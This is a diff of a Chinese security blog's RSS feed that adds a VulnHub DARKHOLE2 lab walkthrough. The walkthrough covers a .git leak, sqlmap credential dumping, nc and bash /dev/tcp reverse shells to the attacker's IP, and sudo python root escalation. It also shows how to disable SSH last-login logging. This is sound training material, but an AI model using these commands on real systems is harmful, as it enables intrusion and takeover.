@@ -7,45 +7,45 @@
         <language>zh-CN</language>
         <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
         <lastBuildDate>Mon, 01 Nov 2021 00:00:00 +0800</lastBuildDate>
-        <category>生命</category>
-        <category>人生</category>
-        <category>命运</category>
-        <category>成长</category>
-        <category>人生哲学</category>
-        <category>神学</category>
-        <category>意义</category>
-        <category>社会</category>
-        <category>爱情</category>
-        <category>人性</category>
-        <category>历史</category>
-        <category>道德</category>
-        <category>渗透测试</category>
-        <category>Linux</category>
-        <category>ENTJ</category>
         <category>ENTP</category>
-        <category>Trojan</category>
-        <category>信息安全网址</category>
-        <category>ENFJ</category>
-        <category>ESTJ</category>
-        <category>ESTP</category>
-        <category>ENFP</category>
-        <category>INFJ</category>
-        <category>ESFP</category>
         <category>ESFJ</category>
+        <category>ENFP</category>
+        <category>ESFP</category>
+        <category>ENTJ</category>
+        <category>ESTJ</category>
+        <category>ENFJ</category>
+        <category>ESTP</category>
+        <category>INFJ</category>
         <category>INFP</category>
-        <category>ISFJ</category>
-        <category>INTP</category>
         <category>INTJ</category>
         <category>ISFP</category>
-        <category>ISTJ</category>
         <category>ISTP</category>
+        <category>ISTJ</category>
         <category>MBTI</category>
+        <category>INTP</category>
         <category>心理测试</category>
+        <category>ISFJ</category>
         <category>VULNHUB 1-10</category>
         <category>VULNHUB 11-20</category>
         <category>VULNHUB 21-30</category>
         <category>VULNHUB 31-40</category>
         <category>VULNHUB 41-50</category>
+        <category>渗透测试</category>
+        <category>信息安全网址</category>
+        <category>Linux</category>
+        <category>Trojan</category>
+        <category>生命</category>
+        <category>人生</category>
+        <category>命运</category>
+        <category>成长</category>
+        <category>意义</category>
+        <category>神学</category>
+        <category>人生哲学</category>
+        <category>历史</category>
+        <category>社会</category>
+        <category>爱情</category>
+        <category>人性</category>
+        <category>道德</category>
         <item>
             <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/141%20CENGBOX3/</guid>
             <title>VULNHUB 41 CENGBOX3</title>
@@ -257,6 +257,357 @@
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1190.png&#34; width=&#34;300&#34; alt=&#34;Image&#34;&gt;
 &lt;p&gt;现在我们所使用的终端就比较工整了，vim 也能全屏使用了&lt;/p&gt;
 &lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1191.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
+ ]]></description>
+        </item>
+        <item>
+            <guid isPermalink="true">http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/</guid>
+            <title>VULNHUB 42 DARKHOLE2</title>
+            <link>http://www.n1h1l157.live/2021/11/01/VULNHUB/142%20DARKHOLE2/</link>
+            <category>VULNHUB 41-50</category>
+            <pubDate>Mon, 01 Nov 2021 00:00:00 +0800</pubDate>
+            <description><![CDATA[ &lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZGFya2hvbGUtMiw3NDAv&#34;&gt;https://www.vulnhub.com/entry/darkhole-2,740/&lt;/span&gt;&lt;br&gt;
+ 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vd2RkLWJsb2cvcC8xNTIzMDgyNi5odG1s&#34;&gt;https://www.cnblogs.com/wdd-blog/p/15230826.html&lt;/span&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
+&lt;p&gt;攻击机 KALI： 192.168.31.135 (由于设置成了 DHCP、可能多变)&lt;br&gt;
+ 靶机 DARKHOLE2：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
+&lt;p&gt;1) 确定靶机 ip 地址和开放的端口&lt;/p&gt;
+&lt;p&gt;由已至内网靶机所在主机 MAC 地址自动扫描靶机服务&lt;br&gt;
+ &lt;code&gt;sudo arp-scan -l | grep &#39;a0&#39; | awk &#39;&amp;#123;print $1,$2&amp;#125;&#39; | cut -d &#39; &#39; -f 1 | xargs sudo nmap -PA&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1192.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;2) 再次对其开放的端口进行详细的扫描&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.12 --min-rate=5000&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1193.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31. 12 、靶机开放端口 22,80&lt;/p&gt;
+&lt;p&gt;-&amp;gt; 并且扫描到了再 80 端口上是存在 git 源码泄漏的&lt;/p&gt;
+&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
+&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTI=&#34;&gt;http://192.168.31.12&lt;/span&gt; 进行信息收集&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1194.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;扫描目录  &lt;code&gt;gobuster dir -x php,txt,html,zip,rar,jpg,png -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://192.168.31.12&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1195.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;依次对得到的目录信息进行访问搜索有价值的信息&lt;/p&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvbG9naW4ucGhw&#34;&gt;http://192.168.31.12/login.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1196.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvZGFzaGJvYXJkLnBocA==&#34;&gt;http://192.168.31.12/dashboard.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1197.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnLw==&#34;&gt;http://192.168.31.12/config/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1198.png&#34; width=&#34;400&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvY29uZmlnL2NvbmZpZy5waHA=&#34;&gt;http://192.168.31.12/config/config.php&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1199.png&#34; width=&#34;510&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过对上述几个目录的信息收集，只能确定一个后台的登陆地址 login.php，和一个不被允许进入的 dashboard.php 两个信息&lt;/p&gt;
+&lt;h3 id=&#34;git源码泄漏利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git源码泄漏利用&#34;&gt;#&lt;/a&gt; .git 源码泄漏利用&lt;/h3&gt;
+&lt;p&gt;在端口扫描阶段因为有.git 的信息，对.git 进行访问&lt;br&gt;
+&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTIvLmdpdC8=&#34;&gt; http://192.168.31.12/.git/&lt;/span&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1200.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;利用 githack 对源码泄漏进行利用&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1201.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;wget https://github.com/lijiejie/GitHack/archive/refs/heads/master.zip -O Githack.zip -q;unzip -q Githack.zip;cd GitHack-master;&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;python3 GitHack.py http://192.168.31.12/.git&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1202.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过.git 文件可以得到此项目的源码&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1203.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;源码中有 config 是敏感文件，进行读取&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1204.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到了数据的账户密码  &lt;code&gt;root:darkhole_2&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;但是通过 githack 的方式读取到的源码没有记录之前的 git 版本，没法使用 git 命令去获取到之前提交的版本&lt;/p&gt;
+&lt;h3 id=&#34;git-log切换git分支&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#git-log切换git分支&#34;&gt;#&lt;/a&gt; git log 切换 git 分支&lt;/h3&gt;
+&lt;p&gt;除了 githack 的利用方式之外还可以用如下方式&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;TF=$(mktemp -d); cd $TF;wget -r http://192.168.31.12/.git/ -q; cd $TF/192.168.31.12 &amp;amp;&amp;amp; git clone. webapp &amp;amp;&amp;amp; cd webapp&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1205.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过这种方式可以得到.git 文件，执行 git 的相关命令&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;git log&lt;/code&gt;  查看之前提交的版本，看到有一次提交信息是涉及到 login.php 的，切换到该分支查看&lt;br&gt;
+ &lt;code&gt;git reset --hard a4d900a8d85e8938d3601f3cef113ee293028e10&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1206.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;在 login.php 内容中看到了用户名和密码 &lt;code&gt;lush@admin.com:321&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1207.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;sqlmap一把梭&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqlmap一把梭&#34;&gt;#&lt;/a&gt; sqlmap 一把梭&lt;/h3&gt;
+&lt;p&gt;通过得到的用户名和密码进入到了对方后台管理中心&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1208.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;观察 url 地址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuOTQvZGFzaGJvYXJkLnBocD9pZD0x&#34;&gt;http://192.168.31.94/dashboard.php?id=1&lt;/span&gt;&lt;/p&gt;
+&lt;p&gt;似乎是存在 sql 注入的，通过 burp 截取数据包&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1209.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;&lt;code&gt;sqlmap -r 1.txt --dbs --batch&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1210.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;跑出来了数据库的名字 darkhole_2，继续测试数据库中有哪些表&lt;br&gt;
+ &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 --tables&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1211.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到两张表，选取 ssh 表去查看有哪些列&lt;br&gt;
+ &lt;code&gt;sqlmap -r 1.txt --dbs --batch - D darkhole_2 -T ssh --columns&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1212.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;得到此表下的三个字段 user、id、pass&lt;br&gt;
+ &lt;code&gt;sqlmap -r 1.txt --batch -D darkhole_2 -T ssh -C user,id,pass --dump&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1213.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;最终得到了数据库的用户名和密码 &lt;code&gt;jehad:fool&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1214.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;凭借凭据 jehad 拿到了靶机上一个普通用户的权限&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1215.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;查看靶机上有没有开放特殊的端口&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1216.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;curl-测试网站&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl-测试网站&#34;&gt;#&lt;/a&gt; curl 测试网站&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;发现在这台服务器上有 9999 端口正在运行，但是此端口被防火墙关掉了，我们在 kali 机器上无法访问此端口，可以做 ssh 端口转发将此端口映射到外面，当然也可以通过 curl 命令在这台 linux 机器上直接访问此网站&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;code&gt;curl -vv 127.0.0.1:9999&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1217.png&#34; width=&#34;350&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;可以看到所提交的数据包以及返回的数据包，并且可以看到页面是采用的 php 写的，返回了一个 cmd 的参数，很有可能是命令执行漏洞；执行系统命令，看当前这个网站是属于哪个用户下的&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999?cmd=id;echo &#39;&#39;&lt;/code&gt; &lt;br&gt;
+ &lt;code&gt;echo &#39;&#39;&lt;/code&gt;  的作用使回显比较美观一些，没有实际的作用&lt;br&gt;
+得到了此网站是由用户 losy 的权限搞的，现在需要把 losy 用户的 shell 反弹&lt;br&gt;
+判断 losy 是否可以使用 nc 命令反弹 shell&lt;br&gt;
+ &lt;code&gt;curl 127.0.0.1:9999?cmd=which%20nc;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1218.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;使用 nc 反弹 shell，并在 kali 上进行监听&lt;br&gt;
+ &lt;code&gt;curl 127.0.0.1:9999?cmd=nc%20192.168.31.99%204444%20-e%20/bin/bash;echo &#39;&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1219.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;反弹失败了，有可能是因为被禁用了 nc、也有可能是未采用 base 64 编码，需要都进行尝试一番，使用 bash 反弹 shell 时的命令执行成功了&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;curl 127.0.0.1:9999/?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.31.99%2F4444%200%3E%261%27&lt;/code&gt; &lt;br&gt;
+ 采用的命令即是： &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31. 99 /4444 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1220.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;调整为标准终端&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#调整为标准终端&#34;&gt;#&lt;/a&gt; 调整为标准终端&lt;/h3&gt;
+&lt;p&gt;调整为一个标准的 tty 终端&lt;/p&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;__import__(&amp;#x27;pty&amp;#x27;).spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty -a&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1221.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
+&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调整TERM、&lt;span class=&#34;built_in&#34;&gt;stty&lt;/span&gt;的窗口大小&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty rows 31 columns 118&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1222.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;此刻的我们已经拿到了 losy 用户的 shell&lt;/p&gt;
+&lt;h3 id=&#34;历史遗留信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#历史遗留信息&#34;&gt;#&lt;/a&gt; 历史遗留信息&lt;/h3&gt;
+&lt;p&gt;在 kali 上给靶机传输一个 pspy 看看有没有敏感任务被执行&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1223.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;看到在 /opt/web 下有一个 php 启动本地 9999 端口的命令&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1224.png&#34; width=&#34;660&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;由此造成了 9999 端口处的命令执行漏洞&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1225.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;到处查看文件，找到了在 bash_history 里边的敏感记录，当中有一个密码，发现这个密码不是 root 用户的，只是 losy 用户的，这个密码也可以爆破得到&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1226.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;通过 &lt;code&gt;sudo -l&lt;/code&gt;  查到了一条隐私设置错误的记录&lt;br&gt;
+ `sudo -u root python3 -c “&lt;strong&gt;import&lt;/strong&gt;(‘os’).system(’/bin/bash’)”``&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1227.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;-&amp;gt; 提权成功拿到了 root 权限&lt;/p&gt;
+&lt;h3 id=&#34;ssh-显示系统信息&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-显示系统信息&#34;&gt;#&lt;/a&gt; ssh 显示系统信息&lt;/h3&gt;
+&lt;p&gt;对于 ssh 登陆之后有大量的系统信息展示出来，这在我们看来是完全没有必要的，而且占用了大量的屏幕不太友好，接下来就自定义 ssh 登陆后的信息&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1228.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这是默认显示的信息，分了两部分，上面的是打印的系统信息，下面的是最后登陆到此服务器的时间和 ip&lt;/p&gt;
+&lt;p&gt;上边的信息来自来自 /run/motd.dynamic 文件&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1229.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;这个文件的信息无法修改，哪怕被清空了也会复原。&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1230.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;它是由 /etc/update-motd.d/ 下的几个脚本文件来动态生成的。将 /etc/update-motd.d/ 下的脚本移除或者去掉可执行权限可将此动态生成的系统信息去掉。&lt;br&gt;
+ &lt;code&gt;chmod -x /etc/update-motd.d/*;echo &amp;gt; /run/motd.dynamic;&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1231.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;反之，赋予这个文件夹所有文件可执行权限之后，可以显示出系统信息开启 linux 系统信息展示： &lt;code&gt;chmod +x /etc/update-motd.d/*&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;ssh-最后登录ip&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-最后登录ip&#34;&gt;#&lt;/a&gt; ssh 最后登录 ip&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;下面的这条显示最后登陆信息是由 ssh 控制，ssh 默认是开启此记录的，可修改 ssh 的配置文件，令其消失不见，关闭最后登陆的日志命令如下：&lt;br&gt;
+ &lt;code&gt;sed -i &#39;s/#PrintLastLog yes/PrintLastLog no/g&#39; /etc/ssh/sshd_config;systemctl restart sshd&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1232.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;p&gt;最后登陆的消息一般来说比较重要，可以方便的看到自己的机器是否有异地登陆的情况出现，开启最后登陆的日志命令如下：&lt;/p&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1233.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;ssh-登录时logo&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-登录时logo&#34;&gt;#&lt;/a&gt; ssh 登录时 logo&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;很多时候我们需要自定义一些登陆后的 logo 展示，可以选在登陆前或者登陆后显示一些 logo，而 /etc/motd 的作用就是用来登陆之后会显示的内容，可在 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYm9vdHNjaG9vbC5uZXQvYXNjaWklRTQlQjglOEElRTglQkYlOUIlRTglQTElOEMlRTUlQUQlOTclRTYlQUYlOEQlRTclOUElODQlRTUlOUIlQkUlRTUlQkQlQTIlRTclQkMlOTYlRTclQTAlODE=&#34;&gt;https://www.bootschool.net/ascii 上进行字母的图形编码&lt;/span&gt;&lt;br&gt;
+开启 linux 登陆 logo 提示：&lt;br&gt;
+ &lt;code&gt;echo -e &#39;\n\n\t\t██╗ ██╗ ████████╗\n\t\t╚██╗██╔╝ ╚══██╔══╝\n\t\t ╚███╔╝ ██║ \n\t\t ██╔██ ╗ ██║ \n\t\t██╔╝ ██╗███████╗██║ \n\t\t ╚═╝ ╚═╝╚══════╝╚═╝\n&#39; &amp;gt; /etc/motd&lt;/code&gt; &lt;br&gt;
+-e 表示开启转义 \n 表示换行 \t 表示 tab 按键&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1234.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;关闭这个 logo 提示，只需要将 /etc/motd 清空就可以&lt;br&gt;
+ &lt;code&gt;echo &amp;gt; /etc/motd;vim /etc/motd +&amp;quot;d 1 &amp;quot; +wq&lt;/code&gt;  会有一个空格&lt;br&gt;
+ &lt;code&gt;cat /dev/null &amp;gt; /etc/motd&lt;/code&gt;  没有任何东西，直接清空文件&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1235.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;上述命令是用来展示或者不展示在 linux 登陆之后的 logo，还有一种方式是用来添加在 linux 登陆之前就来展示的 logo，使用 /etc/issue.net 来控制&lt;br&gt;
+ &lt;code&gt;sed -i &#39;s/#Banner none/Banner \/etc\/issue.net/g&#39; /etc/ssh/sshd_config;systemctl restart sshd; echo -e &#39;\n\t\t███████╗██╗ ██╗██╗ ██╗\n\t\t╚══███╔╝╚██╗ ██╔╝██║ ██║\n\t\t ███╔╝ ╚████╔╝ ███████║\n\t\t ███╔╝ ╚██╔╝ ██╔══██║\n\t\t███████╗ ██║ ██║ ██║\n\t\t╚══════╝ ╚═╝ ╚═╝ ╚═╝&#39; &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1236.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;可以看到这条 logo 信息是在我们输入 root 密码之前就显示出来的，是在登陆前显示的，/etc/issue.net 的作用就是登陆前显示信息&lt;br&gt;
+将登陆后的信息也显示一下进行对比就更容易理解执行前面的命令，给 /etc/motd 重新打印出来了 X_T 的样式&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1237.png&#34; width=&#34;550&#34; alt=&#34;Image&#34;&gt;
+&lt;blockquote&gt;
+&lt;p&gt;/etc/issue.net 显示在登陆前，/etc/motd 显示在登陆后&lt;br&gt;
+一键关闭登陆前的信息展示&lt;br&gt;
+ &lt;code&gt;sed -i &#39;s/Banner \/etc\/issue.net/#Banner none/g&#39; /etc/ssh/sshd_config;systemctl restart sshd;echo &amp;gt; /etc/issue.net&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-1238.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
+&lt;h3 id=&#34;ssh-自定义登录文字&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-自定义登录文字&#34;&gt;#&lt;/a&gt; ssh 自定义登录文字&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;除了上述几种方式外，我们还可以添加自定义的语句到环境变量中，登陆到 shell 后就会执行&lt;/p&gt;
+&lt;/blockquote&gt;
